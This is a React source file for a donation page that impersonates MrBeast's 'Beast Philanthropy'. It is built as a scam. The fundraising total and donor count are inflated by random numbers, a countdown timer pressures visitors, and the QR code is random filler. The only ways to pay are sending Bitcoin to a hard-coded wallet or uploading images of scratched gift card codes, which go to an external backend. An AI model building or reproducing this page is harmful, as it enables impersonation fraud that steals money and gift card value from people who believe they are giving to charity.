"use client"

import React, { useState, useEffect, useRef } from 'react';
import axios from "axios";
import { Heart, Target, Users, Trophy, Zap, Share2, Play, Gift, DollarSign, Clock, Star, Bitcoin, Copy, Upload, CheckCircle } from 'lucide-react';

const MrBeastFundraisingPlatform = () => {
  const [currentGoal, setCurrentGoal] = useState(2847650);
  const [totalGoal] = useState(5000000);
  const [donorCount, setDonorCount] = useState(42847);
  const [timeLeft, setTimeLeft] = useState({ days: 15, hours: 8, minutes: 23, seconds: 45 });
  const [selectedAmount, setSelectedAmount] = useState(50);
  const [paymentMethod, setPaymentMethod] = useState('crypto');
  const [isAnimating] = useState(false);
  const [transactionProof, setTransactionProof] = useState<File | null>(null);
  const [giftCardType, setGiftCardType] = useState('');
  const [giftCardCountry, setGiftCardCountry] = useState('');
  const [giftCardImages, setGiftCardImages] = useState<File[]>([]);
  const [copiedAddress, setCopiedAddress] = useState(false);
  const paymentSectionRef = useRef<HTMLDivElement | null>(null);
  const isMounted = useRef(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState<string | null>(null);



  useEffect(() => {
    isMounted.current = true;
    return () => {
      isMounted.current = false;
    };
  }, []);


  useEffect(() => {
    const interval = setInterval(() => {
      if (isMounted.current) {
        setCurrentGoal(prev => prev + Math.floor(Math.random() * 500));
        setDonorCount(prev => prev + Math.floor(Math.random() * 3));
      }
    }, 3000);

    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      if (isMounted.current) {
        setTimeLeft(prev => {
          if (prev.seconds > 0) {
            return { ...prev, seconds: prev.seconds - 1 };
          } else if (prev.minutes > 0) {
            return { ...prev, minutes: prev.minutes - 1, seconds: 59 };
          } else if (prev.hours > 0) {
            return { ...prev, hours: prev.hours - 1, minutes: 59, seconds: 59 };
          } else if (prev.days > 0) {
            return { ...prev, days: prev.days - 1, hours: 23, minutes: 59, seconds: 59 };
          }
          return prev;
        });
      }
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const progressPercentage = (currentGoal / totalGoal) * 100;
  const quickAmounts = [10, 50, 100, 500, 1000, 10000];

  const cryptoWallet = {
    currency: 'Bitcoin (BTC)',
    network: 'Bitcoin Network',
    address: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh'
  };

  const validateForm = () => {
    if (!selectedAmount || selectedAmount <= 0) {
      return "Please enter a valid donation amount.";
    }

    if (!paymentMethod) {
      return "Please select a payment method.";
    }

    if (paymentMethod === "crypto") {
      if (!transactionProof) {
        return "Please upload a transaction proof for crypto payment.";
      }
    }

    if (paymentMethod === "giftcard") {
      if (!giftCardType.trim()) {
        return "Please enter gift card type.";
      }
      if (!giftCardCountry.trim()) {
        return "Please enter country/region.";
      }
      if (giftCardImages.length === 0) {
        return "Please upload at least one gift card image.";
      }
    }

    return null; // valid
  };

  const handleDonate = async () => {
    const validationError = validateForm();
    if (validationError) {
      setError(validationError);
      setSuccess(null);
      return;
    }

    try {
      setLoading(true);
      setError(null);
      setSuccess(null);

      const formData = new FormData();
      formData.append("amount", String(selectedAmount));
      formData.append("paymentMethod", paymentMethod);

      if (paymentMethod === "crypto") {
        if (transactionProof) {
          formData.append("proof", transactionProof);
        }
      }

      if (paymentMethod === "giftcard") {
        formData.append("giftCardType", giftCardType);
        formData.append("giftCardCountry", giftCardCountry);
        giftCardImages.forEach((file, index) => {
          formData.append(`giftCardImages[${index}]`, file);
        });
      }

      const endpoint =
        paymentMethod === "crypto"
          ? "https://mrbeastbknd-production.up.railway.app/api/crypto/crypto"
          : "https://mrbeastbknd-production.up.railway.app/api/giftcard/giftcard";

      const res = await axios.post(endpoint, formData, {
        headers: {
          "Content-Type": "multipart/form-data",
        },
      });

      setSuccess("Donation submitted successfully!");
      setError(null);
      console.log("Backend response:", res.data);

      setTransactionProof(null);
      setGiftCardImages([]);
      setGiftCardType("");
      setGiftCardCountry("");
    } catch (err: any) {
      console.error("Donation error:", err);
      setError(
        err.response?.data?.message ||
        "Something went wrong. Please check your connection and try again."
      );
      setSuccess(null);
    } finally {
      setLoading(false);
    }
  };

  const share = () => {
    navigator.share({
      title: 'Support MrBeast',
      text: 'Join me in supporting MrBeast\'s philanthropic efforts!',
      url: window.location.href
    });
  };

  const scrollToTop = () => {
    window.scrollTo({
      top: 400,
      behavior: 'smooth'
    });
  };


  const copyToClipboard = () => {
    try {
      const tempTextArea = document.createElement('textarea');
      tempTextArea.value = cryptoWallet.address;
      document.body.appendChild(tempTextArea);
      tempTextArea.select();
      document.execCommand('copy');
      document.body.removeChild(tempTextArea);
      setCopiedAddress(true);
      setTimeout(() => setCopiedAddress(false), 2000);
    } catch (err) {
      console.error('Failed to copy to clipboard:', err);
    }
  };

  const handleGiftCardUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const files = Array.from(event.target.files ?? []);
    setGiftCardImages(prevImages => [...prevImages, ...files]);
  };

  const handleTransactionProofUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file) setTransactionProof(file);
  };


  const removeTransactionProof = () => {
    setTransactionProof(null);
  };

  const removeGiftCardImage = (index: number) => {
    setGiftCardImages(prevImages => prevImages.filter((_, i) => i !== index));
  };

  const selectAmount = (amount: number) => {
    setSelectedAmount(amount);
    setTimeout(() => {
      paymentSectionRef.current?.scrollIntoView({
        behavior: 'smooth',
        block: 'start'
      });
    }, 100);
  };



  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-900 via-blue-900 to-cyan-900 overflow-hidden font-[Inter]">

      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-20 left-10 w-20 h-20 bg-yellow-400 rounded-full opacity-20 animate-bounce"></div>
        <div className="absolute top-40 right-20 w-16 h-16 bg-pink-400 rounded-full opacity-20 animate-pulse"></div>
        <div className="absolute bottom-20 left-1/4 w-24 h-24 bg-green-400 rounded-full opacity-20 animate-bounce delay-1000"></div>
      </div>

      <nav className="relative z-10 p-4 sm:p-6 flex justify-between items-center">
        <div className="flex items-center space-x-3">
          <div className="w-10 h-10 sm:w-12 sm:h-12 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl flex items-center justify-center font-black text-white text-lg sm:text-xl">
            MB
          </div>
          <span className="text-white font-bold text-lg sm:text-2xl">Beast Philanthropy</span>
        </div>
        <div className="md:flex space-x-6 text-white">
          <img src="mrbeast.jpg" className="rounded-full h-12" alt="Placeholder" />
        </div>
      </nav>

      <div className="relative z-10 container mx-auto px-4 sm:px-6 py-8 sm:py-12">
        <div className="text-center mb-8 sm:mb-12">
          <h1 className="text-4xl sm:text-6xl md:text-8xl font-black text-transparent bg-clip-text bg-gradient-to-r from-yellow-400 via-pink-400 to-cyan-400 mb-4 sm:mb-6 animate-pulse">
            CHANGE THE WORLD
          </h1>
          <p className="text-lg sm:text-xl md:text-2xl text-white mb-6 sm:mb-8 max-w-3xl mx-auto px-4">
            Join millions of Beast Gang members in the biggest fundraising challenge ever!
            Every dollar goes directly to families in need around the globe 🌍
          </p>
        </div>

        <div className="max-w-4xl mx-auto bg-gradient-to-r from-gray-900/80 to-black/80 backdrop-blur-xl rounded-3xl p-4 sm:p-6 lg:p-8 shadow-2xl border border-gray-700">
          <div className="mb-6 sm:mb-8">
            <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-4 space-y-2 sm:space-y-0">
              <div className="text-white">
                <h2 className="text-2xl sm:text-3xl font-bold mb-2">BEAST MODE ACTIVATED!</h2>
                <p className="text-gray-300 text-sm sm:text-base">Help us reach our insane goal!</p>
              </div>
              <div className="text-right">
                <div className="text-3xl sm:text-4xl font-black text-yellow-400">${currentGoal.toLocaleString()}</div>
                <div className="text-gray-400 text-sm sm:text-base">of ${totalGoal.toLocaleString()}</div>
              </div>
            </div>

            <div className="relative h-4 sm:h-6 bg-gray-700 rounded-full overflow-hidden mb-4">
              <div
                className="absolute inset-y-0 left-0 bg-gradient-to-r from-yellow-400 via-pink-400 to-cyan-400 rounded-full transition-all duration-1000 ease-out"
                style={{ width: `${Math.min(progressPercentage, 100)}%` }}
              >
                <div className="absolute inset-0 bg-white opacity-30 animate-pulse"></div>
              </div>
              {progressPercentage >= 100 && (
                <div className="absolute inset-0 animate-ping bg-yellow-400 opacity-75 rounded-full"></div>
              )}
            </div>

            <div className="flex justify-between text-xs sm:text-sm text-gray-400">
              <span>{progressPercentage.toFixed(1)}% Complete</span>
              <span>{donorCount.toLocaleString()} Donors</span>
            </div>
          </div>

          <div className="bg-gradient-to-r from-red-600 to-orange-600 rounded-2xl p-4 sm:p-6 mb-6 sm:mb-8">
            <div className="flex items-center justify-center space-x-2 mb-4">
              <Clock className="text-white w-5 h-5 sm:w-6 sm:h-6" />
              <h3 className="text-white font-bold text-lg sm:text-xl">TIME IS RUNNING OUT!</h3>
            </div>
            <div className="grid grid-cols-4 gap-2 sm:gap-4 text-center">
              {Object.entries(timeLeft).map(([unit, value]) => (
                <div key={unit} className="bg-black/30 rounded-lg p-2 sm:p-3">
                  <div className="text-2xl sm:text-3xl font-black text-white">{value}</div>
                  <div className="text-xs text-gray-300 uppercase">{unit}</div>
                </div>
              ))}
            </div>
          </div>

          <div className="space-y-6 sm:space-y-8">
            <div>
              <h3 className="text-white font-bold text-xl sm:text-2xl mb-4">Choose Your Impact Level</h3>
              <div className="grid grid-cols-2 sm:grid-cols-3 gap-2 sm:gap-3 mb-6">
                {quickAmounts.map(amount => (
                  <button
                    key={amount}
                    onClick={() => selectAmount(amount)}
                    className={`p-3 sm:p-4 rounded-xl font-bold transition-all text-sm sm:text-base ${selectedAmount === amount
                      ? 'bg-yellow-400 text-black transform scale-105'
                      : 'bg-gray-700 text-white hover:bg-gray-600'
                      }`}
                  >
                    ${amount.toLocaleString()}
                  </button>
                ))}
              </div>

              <div className="mb-6" ref={paymentSectionRef}>
                <h4 className="text-white font-semibold mb-3 text-lg sm:text-xl">Payment Method</h4>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  <button
                    onClick={() => setPaymentMethod('crypto')}
                    className={`p-4 rounded-xl font-semibold transition-all flex items-center justify-center space-x-2 ${paymentMethod === 'crypto'
                      ? 'bg-orange-500 text-white transform scale-105'
                      : 'bg-gray-700 text-white hover:bg-gray-600'
                      }`}
                  >
                    <Bitcoin className="w-5 h-5" />
                    <span>Crypto</span>
                  </button>
                  <button
                    onClick={() => setPaymentMethod('giftcard')}
                    className={`p-4 rounded-xl font-semibold transition-all flex items-center justify-center space-x-2 ${paymentMethod === 'giftcard'
                      ? 'bg-green-500 text-white transform scale-105'
                      : 'bg-gray-700 text-white hover:bg-gray-600'
                      }`}
                  >
                    <Gift className="w-5 h-5" />
                    <span>Gift Card</span>
                  </button>
                </div>
              </div>

              {paymentMethod === 'crypto' && (
                <div className="bg-orange-900/30 border border-orange-500/50 rounded-xl p-4 sm:p-6 mb-6">
                  <div className="flex items-center space-x-2 mb-4">
                    <Bitcoin className="text-orange-400 w-6 h-6" />
                    <span className="text-orange-400 font-semibold text-lg">Crypto Payment Details</span>
                  </div>

                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 sm:gap-6 mb-6">
                    {/* QR Code */}
                    <div className="bg-white p-3 sm:p-4 rounded-lg text-center order-2 lg:order-1">
                      <div className="w-40 h-40 sm:w-48 sm:h-48 bg-gray-200 mx-auto mb-2 rounded-lg flex items-center justify-center">
                        <div className="w-32 h-32 sm:w-40 sm:h-40 bg-black rounded grid grid-cols-8 gap-0.5 sm:gap-1 p-1 sm:p-2">
                          {Array.from({ length: 64 }).map((_, i) => (
                            <div key={i} className={`${Math.random() > 0.5 ? 'bg-white' : 'bg-black'} aspect-square rounded-sm`}></div>
                          ))}
                        </div>
                      </div>
                      <p className="text-black text-sm font-medium">Scan QR Code to Pay</p>
                    </div>

                    <div className="space-y-3 sm:space-y-4 order-1 lg:order-2">
                      <div>
                        <label className="text-orange-300 text-sm font-medium block mb-1">Cryptocurrency</label>
                        <div className="bg-gray-800 p-2 sm:p-3 rounded-lg text-white font-mono text-sm sm:text-base">
                          {cryptoWallet.currency}
                        </div>
                      </div>

                      <div>
                        <label className="text-orange-300 text-sm font-medium block mb-1">Network</label>
                        <div className="bg-gray-800 p-2 sm:p-3 rounded-lg text-white font-mono text-sm sm:text-base">
                          {cryptoWallet.network}
                        </div>
                      </div>

                      <div>
                        <label className="text-orange-300 text-sm font-medium block mb-1">Wallet Address</label>
                        <div className="flex flex-col sm:flex-row space-y-2 sm:space-y-0 sm:space-x-2">
                          <div className="flex-1 bg-gray-800 p-2 sm:p-3 rounded-lg text-white font-mono text-xs sm:text-sm break-all">
                            {cryptoWallet.address}
                          </div>
                          <button
                            onClick={copyToClipboard}
                            className={`px-3 sm:px-4 py-2 rounded-lg font-semibold transition-all flex items-center justify-center space-x-1 ${copiedAddress
                              ? 'bg-green-600 text-white'
                              : 'bg-orange-500 hover:bg-orange-400 text-white'
                              }`}
                          >
                            {copiedAddress ? (
                              <>
                                <CheckCircle className="w-4 h-4" />
                                <span className="text-xs sm:text-sm">Copied!</span>
                              </>
                            ) : (
                              <>
                                <Copy className="w-4 h-4" />
                                <span className="text-xs sm:text-sm">Copy</span>
                              </>
                            )}
                          </button>
                        </div>
                        <p className="text-orange-200 text-xs mt-1">Copy wallet address for manual payment</p>
                      </div>
                    </div>
                  </div>

                  <div id="cryptoForm" className="space-y-4">
                    <div>
                      <label className="text-orange-300 text-sm font-medium block mb-2">Donation Amount ($)</label>
                      <input
                        type="number"
                        value={selectedAmount}
                        onChange={(e) => setSelectedAmount(Number(e.target.value))}
                        className="w-full p-3 sm:p-4 bg-gray-700 text-white rounded-xl border-2 border-gray-600 focus:border-orange-400 outline-none text-sm sm:text-base"
                        placeholder="Enter amount"
                        name="amount"
                        id="amount"
                      />
                    </div>

                    <div>
                      <label className="text-orange-300 text-sm font-medium block mb-2">Transaction Proof (Screenshot/Image)</label>
                      <div className="border-2 border-dashed border-orange-500 rounded-xl p-4 sm:p-6 text-center bg-gray-800/50">
                        <Upload className="w-6 h-6 sm:w-8 sm:h-8 text-orange-400 mx-auto mb-2" />
                        <p className="text-orange-300 mb-2 text-sm sm:text-base">Upload transaction proof</p>
                        <p className="text-orange-200 text-xs sm:text-sm mb-4">
                          Upload a <span className="font-semibold text-orange-300">screenshot</span> or image of your transaction
                        </p>
                        <input
                          type="file"
                          accept="image/*"
                          onChange={handleTransactionProofUpload}
                          className="hidden"
                          id="transaction-proof-upload"
                          name="proof"
                        />
                        <label
                          htmlFor="transaction-proof-upload"
                          className="bg-orange-500 hover:bg-orange-400 text-white px-4 sm:px-6 py-2 sm:py-3 rounded-lg font-semibold cursor-pointer inline-block transition-colors text-sm sm:text-base"
                        >
                          Choose Image
                        </label>
                      </div>

                      {transactionProof && (
                        <div className="mt-4">
                          <p className="text-orange-300 text-sm mb-2">Transaction proof uploaded:</p>
                          <div className="relative bg-gray-800 rounded-lg p-3 flex items-center space-x-3">
                            <div className="w-12 h-12 bg-orange-500/20 rounded-lg flex items-center justify-center">
                              <Upload className="w-6 h-6 text-orange-400" />
                            </div>
                            <div className="flex-1">
                              <p className="text-orange-200 text-sm font-medium truncate">{transactionProof.name}</p>
                              <p className="text-orange-300 text-xs">{(transactionProof.size / 1024 / 1024).toFixed(2)} MB</p>
                            </div>
                            <button
                              onClick={removeTransactionProof}
                              className="bg-red-500 text-white rounded-full w-8 h-8 text-sm hover:bg-red-400 transition-colors flex items-center justify-center"
                            >
                              ×
                            </button>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {paymentMethod === 'giftcard' && (
                <div id="giftCardForm" className="bg-green-900/30 border border-green-500/50 rounded-xl p-4 sm:p-6 mb-6">
                  <div className="flex items-center space-x-2 mb-4">
                    <Gift className="text-green-400 w-6 h-6" />
                    <span className="text-green-400 font-semibold text-lg">Gift Card Details</span>
                  </div>

                  <div className="space-y-4">
                    <div>
                      <label className="text-green-300 text-sm font-medium block mb-2">Donation Amount ($)</label>
                      <input
                        type="number"
                        value={selectedAmount}
                        onChange={(e) => setSelectedAmount(Number(e.target.value))}
                        className="w-full p-3 sm:p-4 bg-gray-700 text-white rounded-xl border-2 border-gray-600 focus:border-green-400 outline-none text-sm sm:text-base"
                        placeholder="Enter gift card value"
                        name="amount"
                        id="amount"
                      />
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                      <div>
                        <label className="text-green-300 text-sm font-medium block mb-2">Gift Card Type</label>
                        <input
                          type="text"
                          value={giftCardType}
                          onChange={(e) => setGiftCardType(e.target.value)}
                          className="w-full p-3 sm:p-4 bg-gray-700 text-white rounded-xl border-2 border-gray-600 focus:border-green-400 outline-none text-sm sm:text-base"
                          placeholder="e.g., Amazon, Steam, iTunes"
                          name="giftCardBrand"
                          id='giftCardBrand'
                        />
                      </div>

                      <div>
                        <label className="text-green-300 text-sm font-medium block mb-2">Country/Region</label>
                        <input
                          type="text"
                          value={giftCardCountry}
                          onChange={(e) => setGiftCardCountry(e.target.value)}
                          className="w-full p-3 sm:p-4 bg-gray-700 text-white rounded-xl border-2 border-gray-600 focus:border-green-400 outline-none text-sm sm:text-base"
                          placeholder="e.g., USA, UK, Canada"
                        />
                      </div>
                    </div>

                    <div>
                      <label className="text-green-300 text-sm font-medium block mb-2">Upload Gift Card Images</label>
                      <div className="border-2 border-dashed border-green-500 rounded-xl p-4 sm:p-6 text-center bg-gray-800/50">
                        <Upload className="w-6 h-6 sm:w-8 sm:h-8 text-green-400 mx-auto mb-2" />
                        <p className="text-green-300 mb-2 text-sm sm:text-base">Upload multiple gift card images</p>
                        <p className="text-green-200 text-xs sm:text-sm mb-4">
                          Make sure the codes are <span className="font-semibold text-green-300">clearly scratched and visible</span>
                        </p>
                        <input
                          type="file"
                          multiple
                          accept="image/*"
                          onChange={handleGiftCardUpload}
                          className="hidden"
                          id="giftcard-upload"
                        />
                        <label
                          htmlFor="giftcard-upload"
                          className="bg-green-500 hover:bg-green-400 text-white px-4 sm:px-6 py-2 sm:py-3 rounded-lg font-semibold cursor-pointer inline-block transition-colors text-sm sm:text-base"
                        >
                          Choose Images
                        </label>
                      </div>

                      {giftCardImages.length > 0 && (
                        <div className="mt-4">
                          <p className="text-green-300 text-sm mb-2">{giftCardImages.length} image(s) uploaded:</p>
                          <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-2 sm:gap-3">
                            {giftCardImages.map((file, index) => (
                              <div key={index} className="relative bg-gray-800 rounded-lg p-2">
                                <div className="aspect-video bg-gray-700 rounded flex items-center justify-center">
                                  <Gift className="w-4 h-4 sm:w-6 sm:h-6 text-green-400" />
                                </div>
                                <p className="text-xs text-green-200 mt-1 truncate">{file.name}</p>
                                <button
                                  onClick={() => removeGiftCardImage(index)}
                                  className="absolute -top-1 -right-1 bg-red-500 text-white rounded-full w-5 h-5 sm:w-6 sm:h-6 text-xs hover:bg-red-400 transition-colors flex items-center justify-center"
                                >
                                  ×
                                </button>
                              </div>
                            ))}
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {error && (
                <div className="bg-red-500/20 border border-red-500 text-red-300 p-3 rounded-lg mb-4">
                  {error}
                </div>
              )}
              {success && (
                <div className="bg-green-500/20 border border-green-500 text-green-300 p-3 rounded-lg mb-4">
                  {success}
                </div>
              )}
              <button
                onClick={handleDonate}
                disabled={loading || isAnimating}
                className={`w-full px-6 sm:px-8 py-3 sm:py-4 bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-black rounded-xl transition-all text-sm sm:text-base ${loading || isAnimating
                  ? 'animate-pulse opacity-70'
                  : 'hover:scale-105 hover:shadow-xl'
                  }`}
              >
                {loading || isAnimating ? (
                  <div className="flex items-center justify-center space-x-2">
                    <div className="animate-spin w-4 h-4 sm:w-5 sm:h-5 border-2 border-black rounded-full border-t-transparent"></div>
                    <span>PROCESSING...</span>
                  </div>
                ) : (
                  <>SUBMIT DONATION!</>
                )}
              </button>
            </div>

            <div className="space-y-4">
              <h3 className="text-white font-bold text-lg sm:text-xl">Real Impact Stories</h3>
              <div className="space-y-2 sm:space-y-3">
                {[
                  { icon: Heart, text: "$50 feeds a family for a week", color: "text-pink-400" },
                  { icon: Gift, text: "$100 provides clean water for a month", color: "text-blue-400" },
                  { icon: Star, text: "$500 builds a classroom", color: "text-yellow-400" },
                  { icon: Trophy, text: "$1,000 sponsors a student for a year", color: "text-purple-400" },
                  { icon: Zap, text: "$10,000 builds a water well for a village", color: "text-green-400" }
                ].map((item, idx) => (
                  <div key={idx} className="flex items-center space-x-3 p-2 sm:p-3 bg-gray-800/50 rounded-lg">
                    <item.icon className={`${item.color} w-4 h-4 sm:w-5 sm:h-5 flex-shrink-0`} />
                    <span className="text-white text-xs sm:text-sm">{item.text}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>

        <div className="grid grid-cols-2 md:grid-cols-4 gap-3 sm:gap-6 mt-8 sm:mt-12">
          {[
            { icon: Users, label: "Total Donors", value: donorCount.toLocaleString(), color: "from-blue-500 to-cyan-500" },
            { icon: Target, label: "Goal Progress", value: `${progressPercentage.toFixed(1)}%`, color: "from-green-500 to-emerald-500" },
            { icon: Trophy, label: "Lives Impacted", value: "1.2M+", color: "from-yellow-500 to-orange-500" },
            { icon: Zap, label: "Avg. Donation", value: "$67", color: "from-purple-500 to-pink-500" }
          ].map((stat, idx) => (
            <div key={idx} className={`bg-gradient-to-r ${stat.color} p-4 sm:p-6 rounded-2xl text-center hover:scale-105 transition-transform`}>
              <stat.icon className="w-6 h-6 sm:w-8 sm:h-8 text-white mx-auto mb-2" />
              <div className="text-2xl sm:text-3xl font-black text-white mb-1">{stat.value}</div>
              <div className="text-xs sm:text-sm text-white/80">{stat.label}</div>
            </div>
          ))}
        </div>

        <div className="text-center mt-8 sm:mt-12">
          <h3 className="text-white font-bold text-xl sm:text-2xl mb-4 sm:mb-6">Spread the Beast Energy!</h3>
          <div className="flex justify-center space-x-4">
            <button onClick={share} className="bg-blue-600 text-white p-3 sm:p-4 rounded-full hover:scale-110 transition-transform">
              <Share2 className="w-5 h-5 sm:w-6 sm:h-h" />
            </button>
            <button onClick={scrollToTop} className="bg-pink-600 text-white p-3 sm:p-4 rounded-full hover:scale-110 transition-transform">
              <Heart className="w-5 h-5 sm:w-6 sm:h-6" />
            </button>
            <button className="bg-red-600 text-white p-3 sm:p-4 rounded-full hover:scale-110 transition-transform">
              <a href="https://www.youtube.com/@MrBeast"><Play className="w-5 h-5 sm:w-6 sm:h-6" /></a>
            </button>
          </div>
        </div>
      </div>

      <div className="fixed bottom-6 right-6 sm:bottom-8 sm:right-8">
        <button
          className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black p-3 sm:p-4 rounded-full shadow-2xl hover:scale-110 transition-transform font-bold flex items-center space-x-2"
        >
          <DollarSign className="w-5 h-5 sm:w-6 sm:h-6" />
        </button>
      </div>
    </div>
  );
};

export default MrBeastFundraisingPlatform;